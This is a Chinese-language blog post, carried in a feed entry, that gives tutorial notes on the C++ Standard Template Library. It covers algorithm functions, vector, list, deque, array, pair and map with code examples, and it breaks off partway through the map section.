    <updated>2023-10-06T09:09:05.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><p>参考链接：</p><p><a href="http://c.biancheng.net/stl/">http://c.biancheng.net/stl/</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>STL，英文全称 standard template library，中文可译为标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入&#x2F;输出、数学计算等功能。</p><p>STL 最初由惠普实验室开发，于 1998 年被定为国际标准，正式成为 C++ 程序库的重要组成部分。值得一提的是，如今 STL 已完全被内置到支持 C++ 的编译器中，无需额外安装，这可能也是 STL 被广泛使用的原因之一。</p><p>STL 就位于各个 C++ 的头文件中，即它并非以二进制代码的形式提供，而是以源代码的形式提供。</p><p>从根本上说，STL 是一些容器、算法和其他一些组件的集合，所有容器和算法都是总结了几十年来算法和数据结构的研究成果，汇集了许多计算机专家学者经验的基础上实现的，因此可以说，STL 基本上达到了各种存储方法和相关算法的高度优化。</p><p><strong>注意，这里提到的容器，本质上就是封装有数据结构的模板类，例如 list、vector、set、map 等</strong></p><p>STL的头文件：algorithm，numeric，vector，deque，list，queue，stack，set，map，iterator，memory，utility</p><h2 id="1-Algorithm"><a href="#1-Algorithm" class="headerlink" title="1. Algorithm"></a>1. Algorithm</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>  <span class="comment">// 使用Algorithm必须包含的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//排序</span></span><br><span class="line">  <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,<span class="number">7</span>&#125;;</span><br><span class="line">  <span class="built_in">sort</span> (a, a+<span class="number">5</span>); </span><br><span class="line">  <span class="comment">// stable_sort (a, a+5);</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 反转</span></span><br><span class="line">  <span class="built_in">reverse</span>(a, a+<span class="number">5</span>);  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绝对值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">abs</span>(<span class="number">-5</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最大值最小值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">max</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">min</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 交换</span></span><br><span class="line">  <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">swap</span> (x, y);</span><br><span class="line">  cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 赋值函数fill</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">  <span class="built_in">fill</span> (b, b+<span class="number">4</span>, <span class="number">-1</span>);   <span class="comment">//前4个元素全赋值为-1</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">    cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求全排列的下一个顺序, next_permutation若有下一个全排列返回true没有则返回false</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">3</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">  &#125;<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(str, str+<span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h2><h3 id="2-1-序列容器"><a href="#2-1-序列容器" class="headerlink" title="2.1 序列容器"></a><strong>2.1 序列容器</strong></h3><p>主要包括 vector 向量容器、list 列表容器以及 deque 双端队列容器。之所以被称为序列容器，是因为元素在容器中的位置同元素的值无关，即<strong>序列容器不是排序的</strong>。将元素插入容器时，指定在什么位置，元素就会位于什么位置。</p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p>vector相比数组的好处是可以根据存储数据的数量自动变长，并且有很多方法可以直接调用。</p><p>vector容器<strong>在尾部增加或删除元素的效率最高</strong>（时间复杂度为 O(1) 常数阶），在其它位置插入或删除元素效率较差（时间复杂度为 O(n) 线性阶，其中 n 为容器中元素的个数）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// -----------------------初始化-----------------------</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a; <span class="comment">//定义容器a，当前a长度为0，但和普通数组不同的是，此a可以根据存储数据的数量自动变长。</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; b &#123;&#125;;   <span class="comment">//指定为空</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">c</span><span class="params">(<span class="number">20</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为0</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20</span>, <span class="number">-1</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为-1，这里可以使用变量进行初始化</span></span><br><span class="line">    <span class="comment">// 使用其他数据结构初始化</span></span><br><span class="line">    <span class="type">int</span> array[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; <span class="built_in">value</span>(array,array+<span class="number">3</span>);  <span class="comment">// 使用数组初始化vector</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; value1&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">value2</span><span class="params">(value1.begin(),value1.begin()+<span class="number">3</span>)</span></span>;   <span class="comment">// 使用vector初始化vector</span></span><br><span class="line">    value2.<span class="built_in">assign</span>(value1.<span class="built_in">begin</span>(),value1.<span class="built_in">begin</span>()+<span class="number">3</span>);    <span class="comment">//使用assign方法初始化</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------手动调整大小-----------------------</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">100</span>);  <span class="comment">// 默认初始化为0</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">20</span>, <span class="number">-1</span>) <span class="comment">//重新调整 a 的大小为 20，并存储 20 个 -1 元素。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    a[<span class="number">9</span>] = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// -----------------------添加元素-----------------------</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)&#123;  <span class="comment">//向a中添加10个元素</span></span><br><span class="line">        a.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>， <span class="number">2</span>);  <span class="comment">//向指定位置的前面添加元素，2个100</span></span><br><span class="line">    a.<span class="built_in">emplace</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>);   <span class="comment">//emplace每次只能插入一个元素，但是emplace的效率更高</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------访问元素-----------------------</span></span><br><span class="line">    cout&lt;&lt;a[<span class="number">0</span>]&lt;&lt;endl;  <span class="comment">// 访问单个元素，直接使用下标，可能越界</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;首个元素为：&quot;</span> &lt;&lt; a.<span class="built_in">at</span>(<span class="number">0</span>) &lt;&lt; endl;   <span class="comment">// 使用at方法访问,会进行越界判断</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 首元素为：&quot;</span> &lt;&lt; values.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 尾元素为：&quot;</span> &lt;&lt; values.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = a.<span class="built_in">begin</span>(); i &lt; a.<span class="built_in">end</span>(); i++) &#123;  <span class="comment">//使用迭代器遍历容器</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------删除-----------------------</span></span><br><span class="line">    a.<span class="built_in">pop_back</span>();   <span class="comment">// 删除最后一个元素，size会减小，但capacity不会变</span></span><br><span class="line">    a,<span class="built_in">erase</span>(a.<span class="built_in">begin</span>(), a,begin+<span class="number">3</span>);  <span class="comment">// 删除指定位置的元素，并返回指向被删除元素下一个位置元素的迭代器，size会减小，但capacity不会变</span></span><br><span class="line">    <span class="keyword">auto</span> it = <span class="built_in">remove</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), <span class="number">3</span>);;  <span class="comment">// 删除等于指定值的元素，并返回指向被删除元素下一个位置元素的迭代器，，size和capacity都不会变</span></span><br><span class="line">    a.<span class="built_in">clear</span>();  <span class="comment">// 清空，size变为0，capacity不会变</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------交换元素-----------------------</span></span><br><span class="line"><span class="comment">// 注意，swap() 函数在头文件 &lt;algorithm&gt; 和 &lt;utility&gt; 中都有定义，使用时引入其中一个即可。</span></span><br><span class="line"><span class="built_in">swap</span>(*(a.<span class="built_in">begin</span>()+<span class="number">1</span>),*(a.<span class="built_in">end</span>()<span class="number">-1</span>));     <span class="comment">//等同于 swap(a[1],a[4])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>注意，vector 容器在使用resize()申请更多内存的同时，容器中的所有元素可能会被复制或移动到新的内存地址，这会导致之前创建的迭代器失效。</u>因此，为了保险起见，每当 vector 容器的容量发生变化时，我们都要对之前创建的迭代器重新初始化一遍：</p><p><u>注意，不要使用vector&lt;bool&gt;，该类型使用bit进行存储，会有很多问题</u></p><p> <strong>array、vector 和 deque 容器的函数成员:</strong></p><table><thead><tr><th>函数成员</th><th>函数功能</th><th>array</th><th>vector</th><th>deque</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个元素的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>end()</td><td>返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rbegin()</td><td>返回指向最后一个元素的迭代器。且++是向左移动</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rend()</td><td>返回指向第一个元素所在位置前一个位置的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>assign()</td><td>用新元素替换原有内容。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>size()</td><td>返回实际元素个数。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>empty()</td><td>判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>at()</td><td>使用经过边界检查的索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>resize()</td><td>改变实际元素的个数。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>front()</td><td>返回第一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>back()</td><td>返回最后一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>operator[]</td><td>使用索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>insert()</td><td>在指定的位置插入一个或多个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>emplace_back()</td><td>在序列尾部生成一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>pop_back()</td><td>移出序列尾部的元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>erase()</td><td>移出一个元素或一段元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>clear()</td><td>移出所有的元素，容器大小变为 0。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>swap()</td><td>交换两个容器的所有元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>data()</td><td>返回指向容器中第一个元素的指针。</td><td>是</td><td>是</td><td>-</td></tr></tbody></table><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list容器以<strong>双向链表</strong>的形式组织元素，在这个序列的<strong>任何地方都可以高效地增加或删除元素</strong>（时间复杂度都为常数阶 O(1)），但访问容器中任意元素的<strong>速度要比前三种容器慢</strong>，这是因为 list&lt;T&gt; 必须从第一个元素或最后一个元素开始访问，需要沿着链表移动，直到到达想要的元素。</p><p>另外还有一个forward_list&lt;T&gt;（正向链表容器），和 list 容器非常类似，只不过它以单链表的形式组织元素，它内部的元素只能从第一个元素开始访问，是一类比链表容器快、更节省内存的容器。</p><h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><p>deque容器不仅尾部插入和删除元素高效，在头部插入或删除元素也同样高效，时间复杂度都是 O(1) 常数阶，但是在容器中某一位置处插入或删除元素，时间复杂度为 O(n) 线性阶；</p><p>相比vector，deque可以更方便的在头部增删元素。</p><p><strong>deque容器提供的成员函数：</strong>其余未展示的函数基本与vector相同</p><table><thead><tr><th>函数成员</th><th>函数功能</th></tr></thead><tbody><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td></tr><tr><td>push_front()</td><td>在序列的头部添加一个元素。</td></tr><tr><td>emplace_front()</td><td>在容器头部生成一个元素。和 push_front() 的区别是，该函数直接在容器头部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>emplace_back()</td><td>在容器尾部生成一个元素。和 push_back() 的区别是，该函数直接在容器尾部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>pop_back()</td><td>移除容器尾部的元素。</td></tr><tr><td>pop_front()</td><td>移除容器头部的元素。</td></tr></tbody></table><h4 id="array"><a href="#array" class="headerlink" title="array"></a>array</h4><p>array&lt;T,N&gt;（数组容器）：表示可以存储 N 个 T 类型的元素，是 C++ 本身提供的一种容器。此类容器一旦建立，其<strong>长度就是固定不变的</strong>，这意味着不能增加或删除元素，只能改变某个元素的值；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v;  <span class="comment">// 名为v的有10个double类型的元素的array</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v &#123;&#125;;   <span class="comment">// 初始化全为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>除此之外，stack&lt;T&gt; 和 queue&lt;T&gt; 本质上也属于序列容器，只不过它们都是在 deque 容器的基础上改头换面而成，通常更习惯称它们为容器适配器</u></p><h3 id="2-2-排序容器"><a href="#2-2-排序容器" class="headerlink" title="2.2 排序容器"></a>2.2 排序容器</h3><p>包括 set 集合容器、multiset多重集合容器、map映射容器以及 multimap 多重映射容器。排序容器中的元素默认是由小到大排序好的，即便是插入元素，元素也会插入到适当位置。所以关联容器在查找时具有非常好的性能。multimap、multiset与map、set的唯一不同在于其键可以重复。</p><p>STL中可以使用 pair 类模板来创建“键值对”形式的元素。pair类模板还提供有一个 swap() 成员函数，能够互换 2 个 pair 对象的键值对，其操作成功的前提是这 2 个 pair 对象的键和值的类型要相同。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span>      <span class="comment">// pair 类模板定义在&lt;utility&gt;头文件中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用默认构造函数</span></span><br><span class="line">    pair&lt;string, string&gt; pair1;</span><br><span class="line">    pair1.first = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line">    pair1.second = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="comment">// 直接使用 2 个元素初始化 pair 对象</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair2</span><span class="params">(<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>)</span></span>;</span><br><span class="line">    pair&lt;string, string&gt; pair2 = &#123;<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用pair初始化pair</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair3</span><span class="params">(pair2)</span></span>;</span><br><span class="line">    <span class="comment">// 调用移动构造函数</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair4</span><span class="params">(make_pair(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>))</span></span>;</span><br><span class="line">pair&lt;string, string&gt; pair4 = <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;pair1: &quot;</span> &lt;&lt; pair1.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pair1.second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换键值对</span></span><br><span class="line">    pair1.<span class="built_in">swap</span>(pair2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>定义在 &lt;map&gt; 头文件中，使用该容器存储的数据，其各个元素的键必须是唯一的（即不能重复），该容器会根据各元素键的大小，默认进行升序排序。</p><p><u>注意，使用insert函数插入元素val时</u>，val 参数表示键值对变量，同时该方法会返回一个 pair 对象，其中 pair.first 表示一个迭代器，pair.second 为一个 bool 类型变量：</p><ul><li>如果成功插入 val，则该迭代器指向新插入的 val，bool 值为 true；</li><li>如果插入 val 失败，则表明当前 map 容器中存有和 val 的键相同的键值对（用 p 表示），此时返回的迭代器指向 p，bool 值为 false</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span>   <span class="comment">//使用 map 容器，必须引入该头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span>  <span class="comment">// 使用pair</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// -------------------------初始化-------------------------</span></span><br><span class="line">    <span class="comment">//创建一个空的 map 关联式容器，该容器中存储的键值对，其中键为 string 字符串，值也为 string 字符串类型</span></span><br><span class="line">    map&lt;string, string&gt; mymap;</span><br><span class="line">    <span class="comment">//向 mymap 容器中添加数据</span></span><br><span class="line">    mymap[<span class="string">&quot;animal&quot;</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;plant&quot;</span>] = <span class="string">&quot;flower&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;planet&quot;</span>] = <span class="string">&quot;earth&quot;</span>;</span><br><span class="line">    <span class="comment">// 定义的同时初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; &#123;<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>), <span class="built_in">make_pair</span>(<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>) &#125;;</span><br><span class="line">    <span class="function">map&lt;string, <span class="type">int</span>&gt; <span class="title">newMap</span><span class="params">(myMap)</span></span></span><br><span class="line"><span class="function">    <span class="comment">// map默认使用升序排序初始化，所以下面两行代码等价</span></span></span><br><span class="line"><span class="function">    map&lt;string, <span class="type">int</span>, less&lt;string&gt;&gt; myMap</span>&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span> &gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    <span class="comment">// map使用降序排序初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>, greater&lt;string&gt;&gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------添加键值对-------------------------</span></span><br><span class="line">    myMap.<span class="built_in">emplace</span>(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>);</span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">a</span><span class="params">(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>)</span></span>;</span><br><span class="line">    myMap.<span class="built_in">insert</span>(a);   <span class="comment">// 因为map会自动根据键进行排序，所以插入时没有必要指定插入位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------遍历和索引-------------------------</span></span><br><span class="line">    <span class="comment">//使用 map 容器的迭代器，遍历 mymap 容器，并输出其中存储的各个键值对</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = mymap.<span class="built_in">begin</span>(); it != mymap.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        <span class="comment">//输出各个元素中的键和值</span></span><br><span class="line">        cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; =&gt; &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    string a = mymap[<span class="string">&quot;animal&quot;</span>];</span><br><span class="line">    string a = myMap.<span class="built_in">at</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------查找-------------------------</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span 